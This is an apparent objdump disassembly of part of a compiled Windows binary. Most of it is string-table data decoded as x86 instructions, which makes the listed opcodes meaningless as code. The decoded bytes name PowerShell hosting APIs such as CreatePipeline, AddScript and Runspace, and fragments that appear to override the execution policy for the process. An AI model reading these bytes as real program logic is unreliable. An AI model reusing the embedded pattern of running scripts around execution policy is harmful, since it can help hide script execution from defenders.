  40494d:	outs   dx,WORD PTR ds:[esi]
  40494f:	jb     0x4049be
  404951:	popa   
  404952:	je     0x4049bd
  404954:	outs   dx,DWORD PTR ds:[esi]
  404955:	outs   dx,BYTE PTR ds:[esi]
  404956:	popa   
  404957:	ins    BYTE PTR es:[edi],dx
  404958:	push   esi
  404959:	gs jb  0x4049cf
  40495c:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  404963:	pop    edi
  404964:	inc    ebx
  404965:	outs   dx,DWORD PTR ds:[esi]
  404966:	jo     0x4049e1
  404968:	jb     0x4049d3
  40496a:	addr16 push 0x694d0074
  404970:	arpl   WORD PTR [edx+0x6f],si
  404973:	jae    0x4049e4
  404975:	data16 je 0x4049a6
  404978:	push   eax
  404979:	outs   dx,DWORD PTR ds:[esi]
  40497a:	ja     0x4049e1
  40497c:	jb     0x4049d1
  40497e:	push   0x2e6c6c65
  404983:	inc    ebx
  404984:	outs   dx,DWORD PTR ds:[esi]
  404985:	outs   dx,BYTE PTR ds:[esi]
  404986:	jae    0x4049f7
  404988:	ins    BYTE PTR es:[edi],dx
  404989:	gs dec eax
  40498b:	outs   dx,DWORD PTR ds:[esi]
  40498c:	jae    0x404a02
  40498e:	add    BYTE PTR [ebp+0x69],cl
  404991:	arpl   WORD PTR [edx+0x6f],si
  404994:	jae    0x404a05
  404996:	data16 je 0x4049c7
  404999:	push   eax
  40499a:	outs   dx,DWORD PTR ds:[esi]
  40499b:	ja     0x404a02
  40499d:	jb     0x4049f2
  40499f:	push   0x6c6c65
  4049a4:	inc    ebx
  4049a5:	outs   dx,DWORD PTR ds:[esi]
  4049a6:	outs   dx,BYTE PTR ds:[esi]
  4049a7:	jae    0x404a18
  4049a9:	ins    BYTE PTR es:[edi],dx
  4049aa:	gs push ebx
  4049ac:	push   0x6c6c65
  4049b1:	push   ebx
  4049b2:	je     0x404a15
  4049b4:	jb     0x404a2a
  4049b6:	add    BYTE PTR [ebp+0x6d],al
  4049b9:	jo     0x404a2f
  4049bb:	jns    0x4049bd
  4049bd:	push   ebx
  4049be:	je     0x404a32
  4049c0:	gs popa 
  4049c2:	ins    DWORD PTR es:[edi],dx
  4049c3:	add    BYTE PTR [edi+0x70],cl
  4049c6:	outs   dx,BYTE PTR gs:[esi]
  4049c8:	push   ebx
  4049c9:	je     0x404a2c
  4049cb:	outs   dx,BYTE PTR ds:[esi]
  4049cc:	fs popa 
  4049ce:	jb     0x404a34
  4049d0:	dec    ecx
  4049d1:	outs   dx,BYTE PTR ds:[esi]
  4049d2:	jo     0x404a49
  4049d4:	je     0x4049d6
  4049d6:	push   ebx
  4049d7:	jns    0x404a4c
  4049d9:	je     0x404a40
  4049db:	ins    DWORD PTR es:[edi],dx
  4049dc:	cs push esp
  4049de:	gs js  0x404a55
  4049e1:	add    BYTE PTR [ebp+0x6e],al
  4049e4:	arpl   WORD PTR [edi+0x64],bp
  4049e7:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4049ee:	pop    edi
  4049ef:	push   ebp
  4049f0:	outs   dx,BYTE PTR ds:[esi]
  4049f1:	imul   esp,DWORD PTR [ebx+0x6f],0x53006564
  4049f8:	je     0x404a6c
  4049fa:	gs popa 
  4049fc:	ins    DWORD PTR es:[edi],dx
  4049fd:	push   edx
  4049fe:	gs popa 
  404a00:	fs gs jb 0x404a04
  404a04:	push   esp
  404a05:	gs js  0x404a7c
  404a08:	push   edx
  404a09:	gs popa 
  404a0b:	fs gs jb 0x404a0f
  404a0f:	push   edx
  404a10:	gs popa 
  404a12:	fs push esp
  404a14:	outs   dx,DWORD PTR ds:[esi]
  404a15:	inc    ebp
  404a16:	outs   dx,BYTE PTR ds:[esi]
  404a17:	add    BYTE PTR fs:[ebx+0x6c],al
  404a1b:	outs   dx,DWORD PTR ds:[esi]
  404a1c:	jae    0x404a83
  404a1e:	add    BYTE PTR [ecx+0x73],cl
  404a21:	dec    esi
  404a22:	jne    0x404a90
  404a24:	ins    BYTE PTR es:[edi],dx
  404a25:	dec    edi
  404a26:	jb     0x404a6d
  404a28:	ins    DWORD PTR es:[edi],dx
  404a29:	jo     0x404a9f
  404a2b:	jns    0x404a2d
  404a2d:	dec    edi
  404a2e:	jo     0x404a95
  404a30:	outs   dx,BYTE PTR ds:[esi]
  404a31:	add    BYTE PTR [eax+0x69],dl
  404a34:	jo     0x404a9b
  404a36:	ins    BYTE PTR es:[edi],dx
  404a37:	imul   ebp,DWORD PTR [esi+0x65],0x65724300
  404a3e:	popa   
  404a3f:	je     0x404aa6
  404a41:	push   eax
  404a42:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  404a49:	add    BYTE PTR [ebx+0x79],dl
  404a4c:	jae    0x404ac2
  404a4e:	gs ins DWORD PTR es:[edi],dx
  404a50:	cs inc ebx
  404a52:	outs   dx,DWORD PTR ds:[esi]
  404a53:	ins    BYTE PTR es:[edi],dx
  404a54:	ins    BYTE PTR es:[edi],dx
  404a55:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404a5a:	outs   dx,BYTE PTR ds:[esi]
  404a5b:	jae    0x404a8b
  404a5d:	inc    edi
  404a5e:	outs   dx,BYTE PTR gs:[esi]
  404a60:	gs jb  0x404acc
  404a63:	arpl   WORD PTR [eax],ax
  404a65:	dec    ecx
  404a66:	inc    ebp
  404a67:	outs   dx,BYTE PTR ds:[esi]
  404a68:	jne    0x404ad7
  404a6a:	gs jb  0x404ace
  404a6d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  404a71:	xor    DWORD PTR [eax],eax
  404a73:	dec    ecx
  404a74:	inc    ebp
  404a75:	outs   dx,BYTE PTR ds:[esi]
  404a76:	jne    0x404ae5
  404a78:	gs jb  0x404adc
  404a7b:	je     0x404aec
  404a7d:	jb     0x404adf
  404a7f:	xor    DWORD PTR [eax],eax
  404a81:	inc    edi
  404a82:	gs je  0x404aca
  404a85:	outs   dx,BYTE PTR ds:[esi]
  404a86:	jne    0x404af5
  404a88:	gs jb  0x404aec
  404a8b:	je     0x404afc
  404a8d:	jb     0x404a8f
  404a8f:	addr16 gs je 0x404af2
  404a93:	inc    ebx
  404a94:	jne    0x404b08
  404a96:	jb     0x404afd
  404a98:	outs   dx,BYTE PTR ds:[esi]
  404a99:	je     0x404a9b
  404a9b:	inc    ebx
  404a9c:	outs   dx,DWORD PTR ds:[esi]
  404a9d:	ins    DWORD PTR es:[edi],dx
  404a9e:	ins    DWORD PTR es:[edi],dx
  404a9f:	popa   
  404aa0:	outs   dx,BYTE PTR ds:[esi]
  404aa1:	fs inc ebx
  404aa3:	outs   dx,DWORD PTR ds:[esi]
  404aa4:	ins    BYTE PTR es:[edi],dx
  404aa5:	ins    BYTE PTR es:[edi],dx
  404aa6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404aab:	outs   dx,BYTE PTR ds:[esi]
  404aac:	add    BYTE PTR [edi+0x65],ah
  404aaf:	je     0x404b10
  404ab1:	inc    ebx
  404ab2:	outs   dx,DWORD PTR ds:[esi]
  404ab3:	ins    DWORD PTR es:[edi],dx
  404ab4:	ins    DWORD PTR es:[edi],dx
  404ab5:	popa   
  404ab6:	outs   dx,BYTE PTR ds:[esi]
  404ab7:	fs jae 0x404aba
  404aba:	addr16 gs je 0x404b1d
  404abe:	inc    esp
  404abf:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  404ac6:	outs   dx,DWORD PTR ds:[esi]
  404ac7:	outs   dx,BYTE PTR ds:[esi]
  404ac8:	add    BYTE PTR [ecx+0x64],al
  404acb:	fs push ebx
  404acd:	arpl   WORD PTR [edx+0x69],si
  404ad0:	jo     0x404b46
  404ad2:	add    BYTE PTR [ebx+0x79],dl
  404ad5:	jae    0x404b4b
  404ad7:	gs ins DWORD PTR es:[edi],dx
  404ad9:	cs inc ebx
  404adb:	outs   dx,DWORD PTR ds:[esi]
  404adc:	ins    BYTE PTR es:[edi],dx
  404add:	ins    BYTE PTR es:[edi],dx
  404ade:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404ae3:	outs   dx,BYTE PTR ds:[esi]
  404ae4:	jae    0x404ae6
  404ae6:	dec    ecx
  404ae7:	inc    ebp
  404ae8:	outs   dx,BYTE PTR ds:[esi]
  404ae9:	jne    0x404b58
  404aeb:	gs jb  0x404b4f
  404aee:	je     0x404b5f
  404af0:	jb     0x404af2
  404af2:	dec    ebp
  404af3:	outs   dx,DWORD PTR ds:[esi]
  404af4:	jbe    0x404b5b
  404af6:	dec    esi
  404af7:	gs js  0x404b6e
  404afa:	add    BYTE PTR [ecx+0x64],al
  404afd:	add    BYTE PTR fs:[eax+0x69],dl
  404b01:	jo     0x404b68
  404b03:	ins    BYTE PTR es:[edi],dx
  404b04:	imul   ebp,DWORD PTR [esi+0x65],0x74697257
  404b0b:	gs jb  0x404b0e
  404b0e:	addr16 gs je 0x404b71
  404b12:	dec    ecx
  404b13:	outs   dx,BYTE PTR ds:[esi]
  404b14:	jo     0x404b8b
  404b16:	je     0x404b18
  404b18:	dec    ecx
  404b19:	outs   dx,BYTE PTR ds:[esi]
  404b1a:	jbe    0x404b8b
  404b1c:	imul   esp,DWORD PTR [ebp+0x41],0x73
  404b20:	jns    0x404b90
  404b22:	arpl   WORD PTR [eax],ax
  404b24:	addr16 gs je 0x404b87
  404b28:	dec    edi
  404b29:	jne    0x404b9f
  404b2b:	add    BYTE PTR [eax+0x69],dl
  404b2e:	jo     0x404b95
  404b30:	ins    BYTE PTR es:[edi],dx
  404b31:	imul   ebp,DWORD PTR [esi+0x65],0x64616552
  404b38:	gs jb  0x404b9b
  404b3b:	xor    DWORD PTR [eax],eax
  404b3d:	push   eax
  404b3e:	push   ebx
  404b3f:	dec    edi
  404b40:	bound  ebp,QWORD PTR [edx+0x65]
  404b43:	arpl   WORD PTR [eax+eax*1+0x67],si
  404b47:	gs je  0x404ba9
  404b4a:	dec    edi
  404b4b:	jne    0x404bc1
  404b4d:	jo     0x404bc4
  404b4f:	je     0x404b51
  404b51:	push   edx
  404b52:	gs popa 
  404b54:	add    BYTE PTR fs:[edi+ebp*2+0x53],dl
  404b59:	je     0x404bcd
  404b5b:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  404b62:	pop    edi
  404b63:	inc    ebp
  404b64:	outs   dx,BYTE PTR ds:[esi]
  404b65:	fs dec edi
  404b67:	push   ax
  404b69:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  404b70:	add    BYTE PTR [edi+0x65],ah
  404b73:	je     0x404bd4
  404b75:	inc    ebx
  404b76:	outs   dx,DWORD PTR ds:[esi]
  404b77:	jne    0x404be7
  404b79:	je     0x404b7b
  404b7b:	push   eax
  404b7c:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  404b83:	push   ebx
  404b84:	je     0x404be7
  404b86:	je     0x404bed
  404b88:	dec    ecx
  404b89:	outs   dx,BYTE PTR ds:[esi]
  404b8a:	outs   dx,WORD PTR ds:[esi]
  404b8c:	add    BYTE PTR [edi+0x65],ah
  404b8f:	je     0x404bf0
  404b91:	push   eax
  404b92:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  404b99:	push   ebx
  404b9a:	je     0x404bfd
  404b9c:	je     0x404c03
  404b9e:	dec    ecx
  404b9f:	outs   dx,BYTE PTR ds:[esi]
  404ba0:	outs   dx,WORD PTR ds:[esi]
  404ba2:	add    BYTE PTR [eax+0x69],dl
  404ba5:	jo     0x404c0c
  404ba7:	ins    BYTE PTR es:[edi],dx
  404ba8:	imul   ebp,DWORD PTR [esi+0x65],0x74617453
  404baf:	add    BYTE PTR gs:[edi+0x65],ah
  404bb3:	je     0x404c14
  404bb5:	push   ebx
  404bb6:	je     0x404c19
  404bb8:	je     0x404c1f
  404bba:	add    BYTE PTR [edi+0x65],ah
  404bbd:	je     0x404c1e
  404bbf:	push   edx
  404bc0:	gs popa 
  404bc2:	jae    0x404c33
  404bc4:	outs   dx,BYTE PTR ds:[esi]
  404bc5:	add    BYTE PTR [edx+0x75],dl
  404bc8:	outs   dx,BYTE PTR ds:[esi]
  404bc9:	je     0x404c34
  404bcb:	ins    DWORD PTR es:[edi],dx
  404bcc:	gs inc ebp
  404bce:	js     0x404c33
  404bd0:	gs jo  0x404c47
  404bd3:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  404bda:	pop    edi
  404bdb:	inc    ebp
  404bdc:	jb     0x404c50
  404bde:	outs   dx,DWORD PTR ds:[esi]
  404bdf:	jb     0x404c33
  404be1:	arpl   WORD PTR gs:[edi+0x72],bp
  404be5:	add    BYTE PTR fs:[ecx+0x4f],cl
  404be9:	inc    ebp
  404bea:	js     0x404c4f
  404bec:	gs jo  0x404c63
  404bef:	imul   ebp,DWORD PTR [edi+0x6e],0x74754f00
  404bf6:	dec    edi
  404bf7:	dec    bp
  404bf9:	gs ins DWORD PTR es:[edi],dx
  404bfb:	outs   dx,DWORD PTR ds:[esi]
  404bfc:	jb     0x404c77
  404bfe:	inc    ebp
  404bff:	js     0x404c64
  404c01:	gs jo  0x404c78
  404c04:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  404c0b:	pop    edi
  404c0c:	inc    edx
  404c0d:	popa   
  404c0e:	jae    0x404c75
  404c10:	dec    edi
  404c11:	bound  ebp,QWORD PTR [edx+0x65]
  404c14:	arpl   WORD PTR [eax+eax*1+0x67],si
  404c18:	gs je  0x404c7a
  404c1b:	inc    ebp
  404c1c:	js     0x404c81
  404c1e:	gs jo  0x404c95
  404c21:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  404c28:	imul   ebp,DWORD PTR [esi+0x67],0x6c697542
  404c2f:	fs gs jb 0x404c33
  404c33:	inc    ecx
  404c34:	jo     0x404ca6
  404c36:	outs   dx,BYTE PTR gs:[esi]
  404c38:	fs dec esp
  404c3a:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  404c41:	pop    edi
  404c42:	dec    ecx
  404c43:	outs   dx,BYTE PTR ds:[esi]
  404c44:	outs   dx,BYTE PTR ds:[esi]
  404c45:	gs jb  0x404c8d
  404c48:	js     0x404cad
  404c4a:	gs jo  0x404cc1
  404c4d:	imul   ebp,DWORD PTR [edi+0x6e],0x766e4900
  404c54:	outs   dx,DWORD PTR ds:[esi]
  404c55:	arpl   WORD PTR [ecx+0x74],sp
  404c58:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  404c5f:	add    BYTE PTR [edi+0x65],ah
  404c62:	je     0x404cc3
  404c64:	dec    ecx
  404c65:	outs   dx,BYTE PTR ds:[esi]
  404c66:	jbe    0x404cd7
  404c68:	arpl   WORD PTR [ecx+0x74],sp
  404c6b:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  404c72:	add    BYTE PTR [edi+0x65],ah
  404c75:	je     0x404cd6
  404c77:	push   ebx
  404c78:	arpl   WORD PTR [edx+0x69],si
  404c7b:	jo     0x404cf1
  404c7d:	dec    esp
  404c7e:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  404c85:	gs jb  0x404c88
  404c88:	addr16 gs je 0x404ceb
  404c8c:	dec    esp
  404c8d:	imul   ebp,DWORD PTR [esi+0x65],0x6d6f4300
  404c94:	jo     0x404cff
  404c96:	ins    BYTE PTR es:[edi],dx
  404c97:	gs jb  0x404ce1
  404c9a:	outs   dx,BYTE PTR gs:[esi]
  404c9c:	gs jb  0x404d00
  404c9f:	je     0x404d06
  404ca1:	fs inc ecx
  404ca3:	je     0x404d19
  404ca5:	jb     0x404d10
  404ca7:	bound  esi,QWORD PTR [ebp+0x74]
  404caa:	add    BYTE PTR gs:[ecx+0x6e],cl
  404cae:	je     0x404ce3
  404cb0:	xor    al,BYTE PTR [eax]
  404cb2:	addr16 gs je 0x404d15
  404cb6:	inc    ebx
  404cb7:	jne    0x404d2b
  404cb9:	jb     0x404d20
  404cbb:	outs   dx,BYTE PTR ds:[esi]
  404cbc:	je     0x404d01
  404cbe:	jne    0x404d2c
  404cc0:	je     0x404d37
  404cc2:	jb     0x404d29
  404cc4:	add    BYTE PTR [esi],ch
  404cc6:	arpl   WORD PTR [ebx+0x74],sp
  404cc9:	outs   dx,DWORD PTR ds:[esi]
  404cca:	jb     0x404ccc
  404ccc:	addr16 gs je 0x404d2f
  404cd0:	inc    esi
  404cd1:	jne    0x404d3f
  404cd3:	ins    BYTE PTR es:[edi],dx
  404cd4:	dec    esi
  404cd5:	popa   
  404cd6:	ins    DWORD PTR es:[edi],dx
  404cd7:	add    BYTE PTR gs:[ebp+0x6f],cl
  404cdb:	fs jne 0x404d4a
  404cde:	add    BYTE PTR gs:[edi+0x65],ah
  404ce2:	je     0x404d43
  404ce4:	dec    ebp
  404ce5:	outs   dx,DWORD PTR ds:[esi]
  404ce6:	fs jne 0x404d55
  404ce9:	add    BYTE PTR gs:[ebp+0x69],cl
  404ced:	arpl   WORD PTR [edx+0x6f],si
  404cf0:	jae    0x404d61
  404cf2:	data16 je 0x404d23
  404cf5:	push   ebx
  404cf6:	jno    0x404d64
  404cf8:	push   ebx
  404cf9:	gs jb  0x404d72
  404cfc:	gs jb  0x404d2d
  404cff:	dec    ebp
  404d00:	popa   
  404d01:	outs   dx,BYTE PTR ds:[esi]
  404d02:	popa   
  404d03:	gs ins DWORD PTR es:[di],dx
  404d06:	outs   dx,BYTE PTR gs:[esi]
  404d08:	je     0x404d38
  404d0a:	push   eax
  404d0b:	outs   dx,DWORD PTR ds:[esi]
  404d0c:	ja     0x404d73
  404d0e:	jb     0x404d63
  404d10:	push   0x2e6c6c65
  404d15:	inc    ebp
  404d16:	js     0x404d7b
  404d18:	gs jo  0x404d8f
  404d1b:	imul   ebp,DWORD PTR [edi+0x6e],0x706d6554
  404d22:	ins    BYTE PTR es:[edi],dx
  404d23:	popa   
  404d24:	je     0x404d8b
  404d26:	jae    0x404d7b
  404d28:	push   edx
  404d29:	cs jb  0x404d91
  404d2c:	jae    0x404d9d
  404d2e:	jne    0x404da2
  404d30:	arpl   WORD PTR [ebp+0x73],sp
  404d33:	add    BYTE PTR [eax],al
  404d35:	sbb    DWORD PTR [eax+0x0],edx
  404d38:	push   ebx
  404d39:	add    BYTE PTR [ebp+0x0],cl
  404d3c:	outs   dx,DWORD PTR ds:[esi]
  404d3d:	add    BYTE PTR [eax+eax*1+0x75],ah
  404d41:	add    BYTE PTR [eax+eax*1+0x65],ch
  404d45:	add    BYTE PTR [eax+0x0],dl
  404d48:	popa   
  404d49:	add    BYTE PTR [eax+eax*1+0x68],dh
  404d4d:	add    BYTE PTR [eax],al
  404d4f:	adc    eax,0x650072
  404d54:	jae    0x404d56
  404d56:	je     0x404d58
  404d58:	jb     0x404d5a
  404d5a:	imul   eax,DWORD PTR [eax],0x740063
  404d60:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  404d65:	xor    BYTE PTR [edi+0x4f0053],0x46
  404d6c:	add    BYTE PTR [eax+eax*1+0x57],dl
  404d70:	add    BYTE PTR [ecx+0x0],al
  404d73:	push   edx
  404d74:	add    BYTE PTR [ebp+0x0],al
  404d77:	pop    esp
  404d78:	add    BYTE PTR [ebp+0x0],cl
  404d7b:	imul   eax,DWORD PTR [eax],0x720063
  404d81:	outs   dx,DWORD PTR ds:[esi]
  404d82:	add    BYTE PTR [ebx+0x0],dh
  404d85:	outs   dx,DWORD PTR ds:[esi]
  404d86:	add    BYTE PTR [esi+0x0],ah
  404d89:	je     0x404d8b
  404d8b:	pop    esp
  404d8c:	add    BYTE PTR [eax+0x0],dl
  404d8f:	outs   dx,DWORD PTR ds:[esi]
  404d90:	add    BYTE PTR [edi+0x0],dh
  404d93:	add    BYTE PTR gs:[edx+0x0],dh
  404d97:	push   ebx
  404d98:	add    BYTE PTR [eax+0x0],ch
  404d9b:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  404da0:	add    BYTE PTR [eax+eax*1+0x31],bl
  404da4:	add    BYTE PTR [eax+eax*1+0x53],bl
  404da8:	add    BYTE PTR [eax+0x0],ch
  404dab:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  404db0:	add    BYTE PTR [ecx+0x0],cl
  404db3:	add    BYTE PTR fs:[ebx+0x0],dh
  404db7:	pop    esp
  404db8:	add    BYTE PTR [ebp+0x0],cl
  404dbb:	imul   eax,DWORD PTR [eax],0x720063
  404dc1:	outs   dx,DWORD PTR ds:[esi]
  404dc2:	add    BYTE PTR [ebx+0x0],dh
  404dc5:	outs   dx,DWORD PTR ds:[esi]
  404dc6:	add    BYTE PTR [esi+0x0],ah
  404dc9:	je     0x404dcb
  404dcb:	add    BYTE PTR cs:[ebx+0x0],dl
  404dcf:	jno    0x404dd1
  404dd1:	ins    BYTE PTR es:[edi],dx
  404dd2:	add    BYTE PTR [ebx+0x0],dl
  404dd5:	add    BYTE PTR gs:[edx+0x0],dh
  404dd9:	jbe    0x404ddb
  404ddb:	add    BYTE PTR gs:[edx+0x0],dh
  404ddf:	add    BYTE PTR cs:[ebp+0x0],cl
  404de3:	popa   
  404de4:	add    BYTE PTR [esi+0x0],ch
  404de7:	popa   
  404de8:	add    BYTE PTR [edi+0x0],ah
  404deb:	add    BYTE PTR gs:[ebp+0x0],ch
  404def:	add    BYTE PTR gs:[esi+0x0],ch
  404df3:	je     0x404df5
  404df5:	add    BYTE PTR cs:[eax+0x0],dl
  404df9:	outs   dx,DWORD PTR ds:[esi]
  404dfa:	add    BYTE PTR [edi+0x0],dh
  404dfd:	add    BYTE PTR gs:[edx+0x0],dh
  404e01:	push   ebx
  404e02:	add    BYTE PTR [eax+0x0],ch
  404e05:	add    BYTE PTR gs:[eax+eax*1+0x6c],ch
  404e0a:	add    BYTE PTR [esi],ch
  404e0c:	add    BYTE PTR [ebx+0x0],dh
  404e0f:	jno    0x404e11
  404e11:	ins    BYTE PTR es:[edi],dx
  404e12:	add    BYTE PTR [eax+0x0],dh
  404e15:	jae    0x404e17
  404e17:	xor    DWORD PTR [eax],eax
  404e19:	xor    DWORD PTR [eax],eax
  404e1b:	xor    BYTE PTR [eax],al
  404e1d:	add    BYTE PTR [edi],bl
  404e1f:	inc    ebp
  404e20:	add    BYTE PTR [eax+0x0],bh
  404e23:	add    BYTE PTR gs:[ebx+0x0],ah
  404e27:	jne    0x404e29
  404e29:	je     0x404e2b
  404e2b:	imul   eax,DWORD PTR [eax],0x6e006f
  404e31:	push   eax
  404e32:	add    BYTE PTR [edi+0x0],ch
  404e35:	ins    BYTE PTR es:[edi],dx
  404e36:	add    BYTE PTR [ecx+0x0],ch
  404e39:	arpl   WORD PTR [eax],ax
  404e3b:	jns    0x404e3d
  404e3d:	add    BYTE PTR ds:0x740053,cl
  404e43:	popa   
  404e44:	add    BYTE PTR [edx+0x0],dh
  404e47:	je     0x404e49
  404e49:	xor    DWORD PTR [eax],eax
  404e4b:	add    BYTE PTR [ebx+0x73],bl
  404e4e:	add    BYTE PTR [ebp+0x0],ah
  404e51:	je     0x404e53
  404e53:	sub    eax,0x78006500
  404e58:	add    BYTE PTR [ebp+0x0],ah
  404e5b:	arpl   WORD PTR [eax],ax
  404e5d:	jne    0x404e5f
  404e5f:	je     0x404e61
  404e61:	imul   eax,DWORD PTR [eax],0x6e006f
  404e67:	jo     0x404e69
  404e69:	outs   dx,DWORD PTR ds:[esi]
  404e6a:	add    BYTE PTR [eax+eax*1+0x69],ch
  404e6e:	add    BYTE PTR [ebx+0x0],ah
  404e71:	jns    0x404e73
  404e73:	and    BYTE PTR [eax],al
  404e75:	jnp    0x404e77
  404e77:	xor    BYTE PTR [eax],al
  404e79:	jge    0x404e7b
  404e7b:	and    BYTE PTR [eax],al
  404e7d:	sub    eax,0x63007300
  404e82:	add    BYTE PTR [edi+0x0],ch
  404e85:	jo     0x404e87
  404e87:	add    BYTE PTR gs:[eax],ah
  404e8a:	add    BYTE PTR [eax+0x0],dh
  404e8d:	jb     0x404e8f
  404e8f:	outs   dx,DWORD PTR ds:[esi]
  404e90:	add    BYTE PTR [ebx+0x0],ah
  404e93:	add    BYTE PTR gs:[ebx+0x0],dh
  404e97:	jae    0x404e99
  404e99:	and    BYTE PTR [eax],al
  404e9b:	sub    eax,0x6f004600
  404ea0:	add    BYTE PTR [edx+0x0],dh
  404ea3:	arpl   WORD PTR [eax],ax
  404ea5:	add    BYTE PTR gs:[ecx],al
  404ea8:	or     eax,0x740073
  404ead:	popa   
  404eae:	add    BYTE PTR [edx+0x0],dh
  404eb1:	je     0x404eb3
  404eb3:	xor    al,BYTE PTR [eax]
  404eb5:	add    BYTE PTR [ebx+0x69],dl
  404eb8:	add    BYTE PTR [ebp+0x0],ch
  404ebb:	jo     0x404ebd
  404ebd:	outs   dx,DWORD PTR ds:[esi]
  404ebe:	add    BYTE PTR [edx+0x0],dh
  404ec1:	je     0x404ec3
  404ec3:	sub    eax,0x6f006d00
  404ec8:	add    BYTE PTR [eax+eax*1+0x75],ah
  404ecc:	add    BYTE PTR [eax+eax*1+0x65],ch
  404ed0:	add    BYTE PTR [eax],ah
  404ed2:	add    BYTE PTR [ebx+0x0],dl
  404ed5:	push   ecx
  404ed6:	add    BYTE PTR [eax+eax*1+0x50],cl
  404eda:	add    BYTE PTR [ebx+0x0],dl
  404edd:	and    BYTE PTR [eax],al
  404edf:	and    BYTE PTR [eax],al
  404ee1:	sub    eax,0x69004400
  404ee6:	add    BYTE PTR [ebx+0x0],dh
  404ee9:	popa   
  404eea:	add    BYTE PTR [edx+0x0],ah
  404eed:	ins    BYTE PTR es:[edi],dx
  404eee:	add    BYTE PTR [ebp+0x0],ah
  404ef1:	dec    esi
  404ef2:	add    BYTE PTR [ecx+0x0],ah
  404ef5:	ins    DWORD PTR es:[edi],dx
  404ef6:	add    BYTE PTR [ebp+0x0],ah
  404ef9:	inc    ebx
  404efa:	add    BYTE PTR [eax+0x0],ch
  404efd:	add    BYTE PTR gs:[ebx+0x0],ah
  404f01:	imul   eax,DWORD PTR [eax],0x69
  404f04:	add    BYTE PTR [esi+0x0],ch
  404f07:	add    BYTE PTR [bx+di],al
  404f0a:	adc    DWORD PTR [ecx+0x0],esp
  404f0d:	add    BYTE PTR [di+0x0],ah
  404f11:	outs   dx,BYTE PTR ds:[esi]
  404f12:	add    BYTE PTR [eax+eax*1+0x6a],dh
  404f16:	add    BYTE PTR [edi+0x0],ch
  404f19:	bound  eax,QWORD PTR [eax]
  404f1b:	add    BYTE PTR ds:0x75004f,dl
  404f21:	je     0x404f23
  404f23:	sub    eax,0x74005300
  404f28:	add    BYTE PTR [edx+0x0],dh
  404f2b:	imul   eax,DWORD PTR [eax],0x67006e
  404f31:	add    DWORD PTR [ecx],esp
  404f33:	inc    ebx
  404f34:	add    BYTE PTR [ecx+0x0],ah
  404f37:	outs   dx,BYTE PTR ds:[esi]
  404f38:	add    BYTE PTR [esi+0x0],ch
  404f3b:	outs   dx,DWORD PTR ds:[esi]
  404f3c:	add    BYTE PTR [eax+eax*1+0x49],dh
  404f40:	add    BYTE PTR [esi+0x0],ch
  404f43:	imul   eax,DWORD PTR [eax],0x690074
  404f49:	popa   
  404f4a:	add    BYTE PTR [eax+eax*1+0x69],ch
  404f4e:	add    BYTE PTR [edx+0x0],bh
  404f51:	add    BYTE PTR gs:[eax],al
  404f54:	or     eax,0x610042
  404f59:	outs   dx,BYTE PTR ds:[esi]
  404f5a:	add    BYTE PTR [esi+0x0],ch
  404f5d:	add    BYTE PTR gs:[edx+0x0],dh
  404f61:	add    BYTE PTR [ecx],cl
  404f63:	dec    eax
  404f64:	add    BYTE PTR [ebp+0x0],ah
  404f67:	ins    BYTE PTR es:[edi],dx
  404f68:	add    BYTE PTR [eax+0x0],dh
  404f6b:	add    BYTE PTR ds:0x720045,ah
  404f71:	jb     0x404f73
  404f73:	outs   dx,DWORD PTR ds:[esi]
  404f74:	add    BYTE PTR [edx+0x0],dh
  404f77:	push   edx
  404f78:	add    BYTE PTR [ebp+0x0],ah
  404f7b:	popa   
  404f7c:	add    BYTE PTR [eax+eax*1+0x69],ah
  404f80:	add    BYTE PTR [esi+0x0],ch
  404f83:	add    BYTE PTR [bp+di+0x0],dl
  404f87:	arpl   WORD PTR [eax],ax
  404f89:	jb     0x404f8b
  404f8b:	imul   eax,DWORD PTR [eax],0x740070
  404f91:	add    BYTE PTR ds:0x720045,bh
  404f97:	jb     0x404f99
  404f99:	outs   dx,DWORD PTR ds:[esi]
  404f9a:	add    BYTE PTR [edx+0x0],dh
  404f9d:	inc    ecx
  404f9e:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404fa2:	add    BYTE PTR [edi+0x0],ch
  404fa5:	arpl   WORD PTR [eax],ax
  404fa7:	popa   
  404fa8:	add    BYTE PTR [eax+eax*1+0x69],dh
  404fac:	add    BYTE PTR [esi+0x0],ch
  404faf:	add    BYTE PTR [di+0x0],cl
  404fb3:	add    BYTE PTR gs:[ebp+0x0],ch
  404fb7:	outs   dx,DWORD PTR ds:[esi]
  404fb8:	add    BYTE PTR [edx+0x0],dh
  404fbb:	jns    0x404fbd
  404fbd:	inc    esi
  404fbe:	add    BYTE PTR [edi+0x0],ch
  404fc1:	jb     0x404fc3
  404fc3:	push   ebx
  404fc4:	add    BYTE PTR [ebx+0x0],ah
  404fc7:	jb     0x404fc9
  404fc9:	imul   eax,DWORD PTR [eax],0x740070
  404fcf:	add    BYTE PTR ds:0x6d0045,ah
  404fd5:	jo     0x404fd7
  404fd7:	je     0x404fd9
  404fd9:	jns    0x404fdb
  404fdb:	push   ebx
  404fdc:	add    BYTE PTR [ebx+0x0],ah
  404fdf:	jb     0x404fe1
  404fe1:	imul   eax,DWORD PTR [eax],0x740070
  404fe7:	dec    ebp
  404fe8:	add    BYTE PTR [ebp+0x0],ah
  404feb:	jae    0x404fed
